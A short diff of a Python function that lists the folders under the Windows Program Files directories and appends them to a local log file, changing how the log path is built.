@@ -1,12 +1,11 @@
-from os import environ,listdir
+from os import listdir
 from manager.logger import Log
 from preferences.config import config
 
 def Programs():
     path = r"C:\Program Files (x86)"
     path1 = r"C:\Program Files"
-    user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}\\System\\Programs.txt'
+    pathToLogs = f'{config.pathToLogs}\\System\\Programs.txt'
     try:
         dirs = listdir(path)
         with open(pathToLogs, "a", encoding="utf-8") as prog:
